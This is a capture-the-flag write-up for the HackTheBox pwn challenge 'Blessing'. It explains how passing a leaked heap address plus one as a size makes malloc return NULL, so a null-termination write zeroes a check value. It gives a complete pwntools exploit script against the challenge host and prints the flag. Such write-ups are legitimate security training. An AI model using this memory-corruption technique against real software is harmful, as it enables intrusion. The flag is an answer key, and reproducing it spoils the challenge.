# Blessing

## Summary

Leaked heap address is used to calculate a size that makes `malloc` fail (return NULL), enabling a write-zero primitive that satisfies a condition to call `read_flag()`.

## Solution

### Step 1: Understand the vulnerability

The program:
1. Allocates `0x30000` bytes via `malloc`, stores `1` at the address, and leaks the address via `%p`
2. Reads an unsigned long (`%lu`) as a song length
3. Calls `malloc(length)` for a second buffer `buf`
4. Reads user input into `buf`, null-terminates `buf[length-1]`, and echoes the data
5. If `*rax_1 == 0` (the first allocation's value), calls `read_flag()`

The trick: by passing `leaked_addr + 1` as the length, `malloc` fails and returns `NULL` (the size is too large). Then `*(buf + length - 1) = 0` writes to `leaked_addr` itself (since `buf = 0` and `length - 1 = leaked_addr`), zeroing the check value.

Note: `read(0, NULL, huge)` **blocks** waiting for input before the kernel checks buffer validity, so a dummy byte must be sent to unblock it.

### Step 2: Exploit

```python
from pwn import *
import re

context.arch = 'amd64'

p = remote('154.57.164.73', 32753)

p.recvuntil(b'Please accept this: ')
leak_line = b''
while True:
    c = p.recv(1, timeout=3)
    if c == b'\x08':  # backspace = clearing animation
        break
    leak_line += c

addr = int(re.search(rb'0x[0-9a-f]+', leak_line).group(), 16)
log.success(f'Leak: {hex(addr)}')

p.recvuntil(b"Give me the song's length: ")
p.sendline(str(addr + 1).encode())
p.send(b'\n')  # unblock read()

flag = p.recvall(timeout=5).decode()
print(flag)
```

## Flag

```
HTB{3v3ryth1ng_l00k5_345y_w1th_l34k5}
```
